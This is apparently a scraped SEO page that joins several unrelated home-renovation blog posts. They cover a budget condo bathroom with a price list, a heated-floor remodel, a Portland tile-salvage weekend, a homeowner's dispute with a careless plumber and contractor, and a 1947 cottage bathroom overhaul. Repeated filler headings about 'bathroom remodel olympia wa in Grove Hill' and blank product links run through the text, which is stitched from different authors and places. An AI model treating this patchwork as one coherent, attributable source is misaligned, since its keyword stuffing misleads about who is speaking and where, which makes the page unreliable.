would change. If I had the funds I would go ahead and change out the original window to an operable, insulated unit. We spent time and money fussing around with the old window, which I think would have been better spent towards a new one. And I would definitely have added in-floor heat because tile is <em>cold&#x2026; </em></p>   <p>So&#x2026;on to the next bathroom! We have a partially finished one upstairs for boys only&#x2026;maybe I should look for a huge urinal&#x2026;hmmm.</p>   <p><strong>Other posts you may like:</strong></p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>  
   <article>   <div>    <h1>Small Bathroom Remodel on a Budget</h1>    <p>by &#xb7; June 1, 2013</p>   <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>   <h2></h2>   <p></p>    <div>     <div>      <p>Last fall, I bought a condo that needed some remodeling. While the bathrooms were usable, they weren&#x2019;t pretty.</p>     <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>     <h2></h2>     <p></p>      <p>I started with the small main floor bathroom remodel since it was a smaller project than the master bathroom and could be finished more quickly.</p>     <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>     <h2></h2>     <p></p>      <p>Since I was also doing a major kitchen renovation and a master bathroom overhaul, the main floor bathroom project needed to be done relatively cheap. Keeping the bathroom renovation on budget was important, but so was making sure it had style since it is the bathroom that will be used by all of my guests.</p>      <h2>Before the Bathroom Remodel:</h2>      <p><span>Bathroom before purchase</span></p>      <p>Bathroom with old oak vanity before renovation</p>      <p>I&#x2019;ve seen bathrooms that are much worse, but this one had a dirty and worn feel to it. The tile floor had dirt in the crevices and the once-light grout was dark with dirt. While it could have been cleaned up, the prospect of keeping off-white tiles clean wasn&#x2019;t making me happy.</p>      <p>I&#x2019;m not a fan of oak, especially 30 year old oak. The vanity was also bigger than needed, making the bathroom feel small. The old vanity was 42 inches and I replaced it with one that is 36 inches. The new vanity has more than enough storage space since it serves as the main floor bedroom&#x2019;s primary bathroom, but also gives me more space between the vanity and toilet for the trash can and anything else I might want to stick there.</p>      <p>And it just makes the bathroom feel more spacious.</p>      <p>A few other things I didn&#x2019;t like in this bathroom include:</p>      <ul>       <li><span>big frameless mirror</span></li>       <li>mirrored medicine cabinet that stuck out about 2 inches from the wall and wasn&#x2019;t needed for storage</li>       <li>pale pink walls</li>       <li>chrome faucet &amp; accessory set</li>       <li>really old shower diverter/knob</li>       <li>no stopper for the tub, making baths impossible</li>       <li>old-looking toilet seat</li>       <li>cultured marble vanity backsplash had separated from the vanity and wall</li>      </ul>      <p>The light fixture wasn&#x2019;t actually bad, but it didn&#x2019;t match my new oil rubbed bronze style, so it got changed.</p>      <h2>Bathroom Remodel Completed:</h2>      <p>This bathroom renovation kept cost down by not replacing things that didn&#x2019;t need replacing &#x2013; the tub, cultured marble shower walls, toilet and recessed light.</p>      <p>Everything else got replaced.</p>      <p>The first thing that happened was the bathroom got a new floor.</p>      <p>The ceramic tile looks amazing. While it was more expensive than if I had picked up the $1 per square foot stuff from Home Depot or Lowe&#x2019;s, this ceramic tile is much thicker and will hold up better over time. With a small bathroom like this, spending a little more for better tile is worth it and doesn&#x2019;t break the bank.</p>      <p>Renovation in progress</p>      <p>Then the new vanity was set in place and the paint went up on the walls.</p>      <p>The vanity was a stock item from Lowe&#x2019;s. I thought about purchasing a stock vanity top with sink too, and it certainly would have been cheaper than going to a granite fabricator and picking my own color. However, I decided this was the one spot I would splurge&#x2026;so I spent a little over $600 more to get my granite top and a large rectangular sink. For me, these 2 pieces take the bathroom from generic to stylish&#x2026;and are worth every penny.</p>      <p>It&#x2019;s amazing how much paint can also transform a room. Going from pale pink to blue gives this bathroom a designer look.</p>      <p>All of the hardware and accessories was changed from chrome to oil rubbed bronze: vanity faucet, shower trim kit, shower head, towel rods, toilet paper holder, shower curtain rod and even the toilet handle. Even the new light fixture is in the oil rubbed bronze finish.</p>      <p> The shower diverter cover plate is extra large because the old shower valve wouldn&#x2019;t work with the Moen diverter and had to be replaced. The remodel plate was needed to cover up the hole cut into the cultured marble to get everything changed over. Yeah, it&#x2019;s big. But it looks much better than sticking with the old shower trim kit and it was much cheaper than replacing the cultured marble.</p>      <p>I bought a new shower curtain and decided to stick with the dark brown trash can and tissue holder from my prior house. All that is left is for me to pick up some chocolate color towels and the bathroom will be totally finished.</p>      <h2>How Much Did it Cost?</h2>      <p>FYI&#x2026;I did not receive any compensation for sharing these product choices with you and will not get paid anything if you decide to purchase them. I&#x2019;m sharing what I bought because I really like the way this bathroom turned out!</p>      <ul>       <li>Tile flooring (Tile Shop $130)</li>       <li> (Lowes $69)</li>       <li> (Lowe&#x2019;s $379)</li>       <li> (Lowe&#x2019;s $129)</li>       <li>Granite Remnant Vanity Top ( $465)</li>       <li>&#xa0;(Amazon $168)</li>       <li>&#xa0;(Amazon $129)</li>       <li>&#xa0;(Amazon $91)</li>       <li> (Amazon $59)</li>       <li>AquaSource Handheld Showerhead (Lowe&#x2019;s $69)</li>       <li>&#xa0;(Amazon $58)</li>       <li>&#xa0;(Amazon $26)</li>       <li>&#xa0;(Amazon $22)</li>       <li>&#xa0;(Amazon $21)</li>       <li>&#xa0;(Amazon $32)</li>       <li>&#xa0;(Amazon $21)</li>       <li>&#xa0;(Amazon $27)</li>       <li> (Home Depot $27)</li>       <li>Behr Satin Enamel Paint (Home Depot $34)</li>      </ul>      <p>I love shopping at Lowe&#x2019;s. Home Depot is great too, but I find Lowe&#x2019;s has a better selection of the products that make your rooms look great. The prices are good and staff is helpful, and you get to see in person what you will be buying.</p>      <p>I also buy a lot of items from Amazon. I&#x2019;m a Prime account holder, so I don&#x2019;t pay for any shipping and most everything arrives in 2-3 days. I&#x2019;ve had a great experience ordering from Amazon, but since returns involve shipping stuff back, I do check at local stores if I&#x2019;m concerned about what something might look like in person&#xa0;when possible.</p>      <p>Even with labor and a few other odds and ends in supplies, the bathroom remodel didn&#x2019;t break the budget.</p>      <p><strong>Could I have done it cheaper?</strong></p>      <p>Sure.</p>      <p>But I also could have spent a lot more by going with a custom vanity, more expensive flooring or updating the tub and shower walls.</p>      </div>    </div>    </div>   </article>

   <div>   <p>Anytime you do a remodel it is so wonderful to be done with all the hard work and to enjoy the new beautiful room you&#x2019;ve created. &#xa0;I am so happy to report that our bathroom is completely done and boy is it an improvement. &#xa0;I really wish everyone could see my bathroom in person to truly appreciate how big this improvement is. &#xa0;We dealt with this ugly bathroom for so long I can&#x2019;t believe how bad it was when I look back at the before pictures. &#xa0;Kelly did such an amazing job. &#xa0;I find myself spending more time than usual in the bathroom because I love it so much.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <div>    <p>BEFORE</p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>   </div>   <p>After tearing out all the big counter tops and cabinets the room was opened up. &#xa0;You will notice the window is still in the same place as it was before and see how much more room there is. &#xa0;The picture is hard to tell but the Roman shade is a gray color. &#xa0;Honestly it is very hard to take pictures in a bathroom. &#xa0;The floor in this picture doesn&#x2019;t show how gray it is, the lighting makes it look browner that it really is.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <div>    <p>AFTER</p>   </div>   <p>&#xa0;I found this shelf at Tia Pan and the decorations at Home Goods. &#xa0;This wall is where the tiny bathtub used to be.</p>   <p>This picture shows the color of the floor much better. &#xa0;I think the floor is my favorite. &#xa0;This tile is long planks that look like wood. &#xa0;There is also something special about the floor&#x2026;.Kelly heated it so when you step out of the shower the floor is all toasty warm.</p>   <p>I knew in my head exactly what color of paint I wanted to match the tile and I love this paint color. &#xa0;Typically I struggle with picking paint colors but as soon as I painted I knew it was perfect. &#xa0;The color is a Pittsburgh paint called Hurricane #408-2. &#xa0;It compliments the grays and greens and blues in the room and gives the room a very warm calming feeling. &#xa0;I think I&#x2019;m going to use this same color in my laundry room.</p>   <div>    <p>BEFORE</p>   </div>   <div>    <p>AFTER</p>   </div>   <p>&#xa0;The shower turned out so much bigger than I expected. &#xa0;I think that&#x2019;s because I was so used to showering in such a tiny shower. &#xa0;Kelly used the floor tile on the tub surround and the niche shelf. &#xa0;He had this idea to make the niche the size of the full back wall of the shower and I think it turned out so unique and at the same time very practical.</p>   <div>    <p>BEFORE</p>   </div>   <div>    <p>AFTER</p>   </div>   <p>The corner was a perfect space for a linen closet. &#xa0;Something I&#x2019;ve never had. &#xa0;Since we&#x2019;ve been married for 25 years it is definitely a good time to buy new towels. &#xa0;I couldn&#x2019;t make myself put the old towels in here so I need to go purchase more new ones.</p>   <div>    <p>BEFORE</p>   </div>   <div>    <p>AFTER</p>   </div>   <p>&#xa0;The toilet is in the same place but with the tub gone we were able to add a much bigger vanity. &#xa0;We chose a black leather granite for the counter tops. &#xa0;This also shows the canvas I showed you how to make last week. &#xa0;You can check that out .</p>   <p>I had a really hard time finding a mirror but I was so excited when I found this one at Tomorrows Antiques in Draper. &#xa0;It is an awesome decor store that has very unique items. &#xa0;It is different than any other mirror I found and that&#x2019;s what I love about it.</p>   <p>Home improvements are a lot of work but stick with it because in the end it is definitely worth it. &#xa0;I was lucky Kelly labored for a few weeks on this project and I had the joy of decorating it.</p>   <p>&#xa0;</p>   <div>    <h3>Related Posts:</h3>   </div>   </div>

   <div>   <time>Feb 6, 2012</time>   <p> <span>, , , </span> </p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <div>    <p>Thought I&#x2019;d write <strong>a quick update on the progress of our never ending bathroom remodel</strong>. I did manage to get a few things done. Not as much as I would have liked though. I&#x2019;m realizing that <strong>this will be a slow project</strong> that we&#x2019;ll probably drag into late Spring.</p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>The main reason we didn&#x2019;t get as much done was the weather. Every year in early February Mother Nature gives us a gift of a few sunny days. This weekend I could see that<strong> my grass in the front yard has started growing again</strong>. Next to the house there are some <strong>bulbs</strong> coming up. If you look closely at the Japanese Maple near our front door you can just make out <strong>the start of spring buds</strong>.</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>Anyway, when we get this <strong>early February reprieve</strong> everyone in Portland drops what they are doing and heads outside. We know too well that we will see constant rain until sometime in May.</p>    <div>     <p>Portland Eastbank Esplanade.</p>    </div>    <p>Rita and I woke up Sunday morning and headed out to to look for more tiles. You can see our tile find at the Habitat for Humanity Restore. We thought we&#x2019;d see what we could find at the Rebuilding Center then maybe take a walk or go skating.</p>    <p>We did manage to find a pretty decent assortment of tiles. Somewhere around 150. <strong>That puts us around 400 tiles.</strong> We need another 150 or so. We probably will go to the to get the rest. It&#x2019;s a bit more expensive but we&#x2019;ll be able to be more specific about color choices.</p>    <p>Anyway, here&#x2019;s a picture of <strong>our haul</strong>. Notice the light we picked up. Hope it&#x2019;s more authentic to our house than the multi-bulb golden thing we have now.</p>    <p>&#xa0;</p>    <div>     <p>Here's the box of tiles we got from the Rebuilding Center on Sunday. 150 tiles. You can also see a couple of retro light shades we scored. 25 bucks for all including the drawer.</p>    </div>    <p>Not a bad haul I think. We then had <strong>a couple of burritos</strong> and did <strong>a great walk</strong> in a North Portland neighborhood that we haven&#x2019;t been in before. I think it was <strong>the Overlook neighborhood</strong>? Beautiful old homes from the 1940&#x2019;s or so. It was great to be out in the sunshine. The homes on the edge of the neighborhood look out onto the river and a train depot.</p>    <div>     <p>View from edge of Overlook Neighborhood in Portland. Downtown Portland in the distance.</p>    </div>    <p>After the walk we weren&#x2019;t quite ready to head home. Instead we decided to head out to the <strong>Eastbank Esplanade</strong> and do a bit of skating. The weather was gorgeous and it was still warm. When we got there it wasn&#x2019;t as crowded as usual. Probably because it was Superbowl Sunday. I like to watch the game but <strong>couldn&#x2019;t pass up being outside on this day</strong>.</p>    <div>     <p>Rita practing her twirls and backwards skating.</p>    </div>    <p>Well, eventually we made it back home. <strong>I did get into the wall and do a bit of work.</strong> The day before I managed to cut out the old fixture and cap off the water pipes. This was necessary to install all <strong>the blocking for the cement board</strong>.</p>    <div>     <p>Here's the old fixture. We want to replace this with a single knob fixture. This one is also off center. The stud marks the center of the tub so it'll have to be trimmed for the fixture to fit.</p>    </div>    <div>     <p>Here I am cutting the copper pipe with my multi purpose tool. I bought one of those wheel cutters for copper pipe but it wouldn't fit in the tight space. The multi tool made short work of the pipe though.</p>    </div>    <p>&#xa0;</p>    <div>     <p>Here are the hot and cold feed pipes cut and capped with a temporary cap. This got the pipes out of the way so I could focus on blocking for the cement board.</p>    </div>    <div>     <p>Here's the wall as it looks now. The new single handle shower valve is in place and some of the blocking for the cement board is done. Next step is to finish the plumbing before I button up the wall.</p>    </div>    <div>     <p>That&#x2019;s it for now. <strong>Not a lot done but I wouldn&#x2019;t have spent the weekend any other way.</strong> Feeling extremely grateful for the sun and warm company I got this weekend. I&#x2019;ll finish that wall when the rain starts.</p>     <dl>      <dd>       Here I am trying not to fall down.

So we began to think that maybe things were getting better. Alas, the cabinets were going in and then the countertop showed up. Guess what? The contract specified granite. Guess what the contractor delivered? &#xa0;You guessed right, a one piece cultured marble. Do you think there might be a price difference between granite and molded countertops? As soon as I turn my back, it seems the contractor is up to his old tricks. &#xa0;I will have pictures next week.</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>   </div>   </div>  
   <div>   <p>In my I mentioned that the biggest project of the year and biggest headache was all part of what I now refer to as the <em>Bathroom Remodel Episode</em>. It all started with the idea of getting a new washer and dryer. That idea then grew into adding a shower to my second bathroom. It sounded so simple and oh, what a convenience it would be for visiting guests to have access to a shower without the need to walk through the master bedroom to get there.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>The first indication of a problem was during the costing process. A plumber, who I&#x2019;ve had occasion to use in the past, was slow getting his numbers to me and that should have been a clue for me to find someone else for this job. I pressed on. Immediately after my return from China in the spring, I persisted in trying to get a firm number from the plumber on the cost of this job. I had chosen the washer and dryer unit and found a good sale price, but I needed to get the project underway and inform the appliance company when to deliver. I was anxious because I had already unhooked the older washer and dryer and was now forced to do my laundry at the closest laundromat &#x2013; 18 miles away! Aside from the added cost of paying to do my laundry, it was a tremendous nuisance to have to spend a hot afternoon or evening in June at the laundromat.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <div>    <p>The old washer and dryer removed, the plumbing relocated and just before changing the windows out.</p>   <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>   </div>   <p>The plumber was central to this project because the initial phase required first, removing the drain lines from the old washing machine and then reinstalling the water and drain lines to the opposite side of the room to accommodate the new stacking washer-dryer units.</p>   <p>After this phase of the project, the window needed to be removed and replaced with one half its size. I was warned that having a window in the vicinity of a shower (or other water source) could cause structural problems in the future if moisture went undetected in an outside wall. I insisted on a window and we agreed on style and size. I wanted air circulation and natural light. After having seen the final room with the small window, I am convinced that without a window the shower, indeed the entire room would be much too dark and I would have to add lighting somewhere in that small space. It is amazing how the smallest bit of natural light can brighten up a room.</p>   <p>So, the old washer and dryer had been out for a month and the weather had been dreadful with rain coming down sideways. Mild rain can be cause for slow-downs in construction projects, but week-long downpours with driving rains bring all outdoor construction projects to a standstill. This was the case during the <em>BRE</em>. There was no point in opening up the backside of the house to remove and replace a window in the pouring rain. It would be a tremendous nuisance for the workers. There was a strong likelihood that we would get water inside the house and perhaps into the basement causing a mess that would require a lot of mopping-up&#x2026;..and so we waited for the rains to pass. By the time the weather settled enough for the project to proceed, I was already a bit peeved at the delay but could not blame it on anyone. Funny how the weather can make or break a good plan.</p>   <p>So the fellow who was sub-contracted by my plumber showed up one fine sunny day and began the process of removing the existing window. Simple enough. However, when he presented the replacement window, it was not what had discussed. Not the window I had told him I wanted. Not the correct style of window. Not what we had agreed on. How does this happen?</p>   <p>I was annoyed. So, he tried to assure me that he can find a window that will work. He called the factory to contact some alleged &#x201c;connection&#x201d; he has with this big shot so and so in a nationally recognized window company with a local outlet. I was not impressed with his self-promoting gibberish about connections and contacts in the right places. I just wanted him to get the window so we may go forward with the project that had already incurred a one month delay. Well, Mr. Big Shot at the window company informs his well connected plumber friend that the window we need to fill the space we have is no longer in stock and would need to be made as a custom order. Custom orders take 4 &#x2013; 6 weeks. I was informed of this and it added to the frustration. I expressed my frustration and annoyance at the incompetence of the carpenter. The window he intended to install was completely unacceptable. It was a window of much lesser quality and value than what we had agreed to. He was trying to slip a sub-standard window into this project and save himself some money on the deal. This is one of the sneaky things some contractors will try to get away with. So, my frustration led to a bit of anger at not getting the right window in a timely manner. The carpenter then made another phone call to one of his connection. This time he comes up with a score. The window available was not exactly what I wanted, but it was available and at a decent price. It sure beat waiting a month or more for what I wanted. I absolutely could not go another month doing my laundry at the pay laundromat! I went and picked up the window which allowed the carpenter time enough to repair the damaged siding we had discussed.</p>   <p>When I returned with the window, it began to rain again. Not a good sign. After an hour the rain subsided and work resumed. The new window was installed and all the damaged siding was replaced. It was a simple job but made complicated by this contractors shadiness. I will never use his service again and I give a poor reference for such sneaky business maneuvers .</p>   <p>Now that the window phase was complete the remainder of the inside work could go on. The wall needed to be rebuilt where the old window had been removed and where the old water lines were. Additionally, the wall for the shower stall needed to be erected and the new plumbing installed inside that wall. After the wall was built, the floor of the shower had to be fitted and the drain installed. Once the shower stall was in place it would be tiled and finished. All of this, I was assured, would be completed within three days&#x2026;.three days turned into 9. I was not happy.</p>   <p>My unhappiness with the contractors I was dealing with led to greater unhappiness when, I measure the wall that the plumber installed for the shower. It looked longer than we talked about. In fact, it stuck out 8 inches farther than what we had agreed to! How does this happen?</p>   <p>This miscalculation was cause for great concern. Why?, you ask. Because, the dimensions of the washer and dryer are such that the machines will not fit between the existing vanity/sink with cupboard and this protruding new wall. The plumber informed me that he would have to charge an additional fee if I want him to reconfigure the vanity. I argued that the reconfiguration would not be necessary if he had properly measured the wall and installed to the dimensions of the plan we set forth!&#x2026;.much noise between two grown men ensued and none of it was pleasant. I directed him to complete the shower and the plumbing by the end of the day. I left him to complete the work and returned after I run my errands. Upon my return the plumber is nowhere to be found. The shower and plumbing are complete, but he had left a huge mess of debris from the project in my garage. His assistant had also left a mess under the house where he had accessed the piping among the floor joists and insulation.</p>   <p>The new washer and dryer were due for delivery tomorrow. The project was way behind schedule and not yet finished. The new kink in the plan involved the reconfiguration of the vanity and I felt, <em>I will be damned</em> if I will pay this idiot anything extra for a mistake of his own making. My sense at this point was that this clown is already being over-paid based on what I have witnessed in terms of shoddy workmanship and his poor work ethic. The most recent mistake, by the way, was only one of many I endured during his contracting of the plan. At that point, I was quite disgusted with the entire project. I had put up with delays due to weather. Delays due to contractors not showing up when they said they would be here to begin the work. Delays because of the wrong materials, and now, a delay because this idiot didn&#x2019;t take a proper measurement! I called and left a message on his voicemail to come by tomorrow so I could cash him out.</p>   <div>    <p>The newly reconfigured vanity and new medicine cabinet.</p>   </div>   <p>He arrived the next day and inquired what I was going to do about the vanity issue and the washer dryer. I told him that I had hired another plumber to reconfigure that, because I was sick of his nonsense and I would not allow him to do another bit of work in my home. I further stated that his work style was appalling and his constant yelling at his inept assistant was annoying to listen to. I suggested that he hire quality help at a decent wage and he wouldn&#x2019;t have to annoy his customers with all the yelling and scolding the ignoramuses that he employed. Finally, I told him to clean up the mess he made and get out!</p>   <div>    <p>The stacking washer/dryer is a real space saver. To the left of the washing unit and behind the wall is the new shower.</p>   </div>   <p>The next day the washer and dryer arrived. As I expected they would not fit properly into the space. So they were installed initially sticking out of the corner and looking quite dysfunctional and ridiculous. But at least I could wash my clothes at home again. The new plumber came a few days later and fixed the issue with the sink and vanity. He had a very economical way of doing it by cutting the existing vanity in half and just replacing the sink and counter top. That saved a couple hundred dollars at the end of a project that had already gone way over cost.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>Thus ended <em>THE BATHROOM REMODEL EPISODE</em>.</p>  </div>  
   <div>   <p>The main floor bathroom in this little cottage was icky. Built in 1947, it was predictable that the room would be small. Sadly, the 1970s update just made it depressing. Sure, it was all neutrals, but they were pretty beat up from years of college age renters.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>&#xa0;</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <figure>    <figcaption>     Main bathroom. Tiny, no window, fiber glass shower surround, laminate counter, stained everything.    </figcaption>   </figure>   <p>Here&#x2019;s what harshed my mellow:</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <ul>    <li>The whole thing was small, 7.5&#x2019;x5.&#x2019; This is the kind of small that makes a person enraged when they hear about &#x201c;small&#x201d; 8&#xd7;10&#x2032; bathrooms. I&#x2019;m one of those people, people.</li>    <li>The finishes were grotty. Laminate and fiberglass, they were on the beat up, scratched side. Faucet was limey/rusting, sink had permanent stains.</li>    <li>The vanity was a problem. It jutted into the room, nailing my hip more than once. Dark and small, it added little storage but seemed to suck the life out of the room. The space was so tight, you couldn&#x2019;t even put a TP holder in it, adjacent to the toilet. And it was LOW. Like back-breaking-think-I&#x2019;ll-skip-washing-face-again low.</li>    <li>I was a little in mourning. My last house had a nice, old, deep tub, and I am a bath taker. This one had a shallow, tiny tub, the opposite of inviting on a cold winter night. Or anytime.</li>    <li>Lighting was grim. Ancient over-sink lighting and a fluorescent light integrated into the fan. No natural light because no window. Even though the bathroom backed onto an exterior wall. Just sad. And annoying.</li>   </ul>   <p>Time to see what could be done right away:</p>   <p>A shower curtain was a given. The bathroom was so grotty that it just didn&#x2019;t make sense to invest in a glass enclosure when it was so obvious that this would be the first major remodel. So I put in a curved double shower rod. Love those things! Extra elbow room in the small shower. An extra rack to hang stuff on.</p>   <figure>    <figcaption>     Double shower rod    </figcaption>   </figure>   <p>I also added a railway rack over the tub for in room towel storage. This would put clean towels in reach within the bathroom. With the linen closet at the other end of the hall and the undersink storage just gross, this was a high priority.</p>   <figure>    <figcaption>     Railway rack, cheapo version.    </figcaption>   </figure>   <p>I kinda don&#x2019;t get why more people don&#x2019;t put these over tubs. The storage improvement is seriously great. It provides a prefect, tidy place to leave wet wash cloths or hang the occasional dripping garment. And, if you think it makes the bathroom look too closed in at say, a party, all ya gotta do put the towels back in the linen closet and the rack sort of disappears.</p>   <p>Next I swapped out the key-locking bathroom knob, anticipating the day a niece or nephew would accidentally lock themselves in the windowless room. This was my first little egg knob. Love it! A classic look but easier to use than a conventional round one. Prettier than the weird, crusted, keyed door knob.</p>   <figure>    <figcaption>     A happy, child-safe little egg knob.    </figcaption>   </figure>   <p>Sadly, that was pretty much it. I tried, I really tried to make it work. Scrubbed till I bled. Tried to overcome that feeling of distaste that I felt every time I walked in the bathroom. Told myself that bathing under a too low shower head was OK. Pretended that a bath with only ten inches of water was still a great way to relax.</p>   <p>This thing needed an overhaul.</p>   <p>Of course, the big question was, what would that overhaul cost? I really had no idea and budget was an issue. So the first step was be to identify every single improvement I anticipated making, including finish choices. And then I would ask the contractor. And then we&#x2019;d see. Maybe something could be done. Maybe nothing.</p>   <p>Here&#x2019;s what we did on a total budget of around $5500, including the window. The contractor I used was The Pros of Idaho (<span>)</span>, who were referred to me by my realtor. Everything they did came in on budget and on time. Everything they subbed out was to a licensed, bonded contractor. When I specified something a little weird, they asked me about it, helping me to correct course or working with my preferences. During the actual work phase, they were kind of obsessed with cleaning up EVERY DAY, which I thought was refreshingly funny. Or maybe just an illustration of how low your standards can go when you live with seven animals.</p>   <p>If you&#x2019;d like to skip the planning details and see how it all turned out, bounce over .</p>   <p><strong>Look and feel.</strong> Given resources and the style, age, and neighborhood, I just didn&#x2019;t think that finishes needed to be extreme to provide a great, functional, in-keeping-with-era bathroom. I prefer older style bathrooms, ones that look crisp, light and fresh. White porcelain, clean metals. That works for me. Wall paint is how I prefer to add and subtract bathroom color, keeping the permanent stuff as classic and simple as possible. My goal was to put in a bathroom that might have been original with just a few modern tweaks.</p>   <p><strong>Function.</strong> With such a small space for the primary bathroom for the whole house, basic function, storage and navigability were top issues. Pretty was secondary, though of course on the wish list. Function choices are discussed in more detail below. Another function note: this is both the main bathroom for everyone AND the guest bathroom. So it was important to make organization/storage choices that would make the bathroom easy to use and virtually always guest ready.</p>   <p><strong>New window:</strong> The room needed a window. Totally ridiculous to have a exterior wall adjacent room of any kind without a window. No wonder the bathroom seemed dank. To be fair, there was no mold. Yet really, it felt like mold was invited but too busy or repulsed to come to the party. Because of where the house is, this window had to be approved by the historical society so there was not much choice about how this window would look. We ended up with a narrow, high, bottom opening casement, which works great. Light comes in. No one can see in.</p>   <p>The Professionals of Idaho installed the window for a very fair price, and did the rest of the bathroom as well. The window was my single biggest splurge at $625. It now also lights the hall, worth every penny.</p>   <p><strong>Tub or Shower?</strong> In a small bathroom, going only shower can make a lot of sense. But this was the primary bath in the house. The other, basement bath had a shower only and was even smaller than this room. I like a good soak, feels great. Kids, who visit often, need a tub. Resale value suggests at least one functioning bathtub in a house is a smart idea. Bath tub it was.&#xa0; I picked the for these reasons:</p>   <ul>    <li>Depth of soak</li>    <li>Liked look</li>    <li>Would fit tiny space</li>   </ul>   <p>&#xa0;</p>   <p><strong>Glass enclosure or shower curtain?</strong> Generally I prefer glass. However, it&#x2019;s more costly and in that small space, a bit unwieldy. By this time, I had fallen in love with my curved shower curtain rod so it seemed wisest to just reuse it, only this time, mount it higher.</p>   <p><strong>Toilet:</strong> Needed a new one, hopefully a lot prettier, with a higher seat and soft close.&#xa0;&#xa0;&#xa0; This seemed like its lines would not fight with the tub: Plus I loved the flip up handle and flat top.</p>   <p><strong>&#xa0;Sink:</strong> Originally I wanted from Foremost Series 1930, with a simple integrated backsplash.</p>   <p>But it was out of stock when I needed it so we went with this number, to match the tub. I don&#x2019;t love it as much as the 30s look but it does look great and clean.</p>   <p>A word about pedestal sinks. Some folks don&#x2019;t get them, citing lost storage space. Here&#x2019;s why they&#x2019;re worth considering:</p>   <ul>    <li>Clean, classic look</li>    <li>With wide rim, some functional surface space is available but not enough to invite clutter</li>    <li>Great in small footprint bathroom, where there&#x2019;s not space to go big or a vanity would darken and shrink the space (and be hard to get into)</li>    <li>Helpful when maneuvering wheelchair &amp; walker using guests</li>    <li>Often higher than a conventional vanity</li>   </ul>   <p><strong>Fixtures:</strong> For most of the bath and sink fixtures, we went with Moen Banbury. It had the right cottage look to it. In brushed nickel, water stains wouldn&#x2019;t show much, which is a really big deal to me. For the main towel rack, I went double to maximize storage.</p>   <p><strong>Railway rack:</strong> I upgraded my el cheapo interim rack with the . Much sturdier, no water spots to show and super handy hooks. This baby was worth every penny.</p>   <p><strong>Redi Niche:</strong> I got two of these inserts. They fit in between the studs and get tiled over to add extra storage. One is on the wall facing the door. The other under the railway rack. This gives me and guests plenty of storage room. These babies do come in other convenient sizes. I just liked the double shelf. For a change, I had one installed with the small shelf on top, the other as shown below.</p>   <p>Part of me wishes I&#x2019;d gone for even more between the studs niches here just to max out storage options. In real life, the two niches are plenty for me.</p>   <p><strong>Tile:</strong> I went classic with the tile. White subway for the tub enclosure and white hex for the floor. Baseboards out of white subway. Grey grout on the floor, light grout on the walls.</p>   <p><strong>Medicine cabinet:</strong> There were so many straight lines already in the bathroom, I went with an oval to break things up. had the convenience of a mirror inside. And, in this small space, I love that it&#x2019;s recessed.</p>   <p>&#xa0;</p>   <p><strong>Over toilet storage/glass shelves:</strong> I wanted to use glass shelves over the toilet. They could be used for display, add guest convenience, hold a lot of stuff when needed and disappear when not. I went with three of Delta&#x2019;s in satin nickel. The look seemed like it would work OK with all the Moen Banbury fixtures AND I really wanted that spot-free satin nickel finish. The Banbury glass shelves were pretty but I disliked the mounting with it&#x2019;s bump, which gave up too much shelf space. In a perfect world, I&#x2019;d have shelves with a little rim around them because of my klutz issue. However, at the time of shopping, all I could find in that style were chrome, or shelves that were only 20.&#x201d;</p>   <p>They might not be a perfect match, but I love these babies. They are serious work horses, able to hold up to 35lbs of stuff.</p>   <p><strong>Main Supplies Storage:</strong> This required a lot of thought. The first thing I made my peace with was that without a vanity, cleaning supplies would need to live elsewhere. Then I found from the Family Handyman and it made ALL THE DIFFERENCE.</p>   <p>Seriously, every time I see a small bathroom solutions article, I think someone else will have done this, it is so perfect. It&#x2019;s not just that it allowed me to ditch the awkward, unopenable vanity; it gave me more and more functional storage!</p>   <p>At this point, my DIY skills were not equal to tearing out the wall and putting this in. I&#x2019;m ok with a lot of imperfections in my projects but for a heavy use bathroom, I wanted it built right. I asked the guys at the Pros of Idaho if they could do it. Waited with dread to hear the pricing and it came in at . . . about $300. Deal! The vanity could go the way of the dodo bird and I&#x2019;d still get some good storage.</p>   <p>Once all this was priced and planned, work began in earnest. Here are some work in progress shots. If you&#x2019;d like to skip on to see how it all turned out, and how it&#x2019;s holding up almost two years later, go .</p>   <p><strong>Up next:</strong> </p>   <p>Have you done a bathroom remodel?

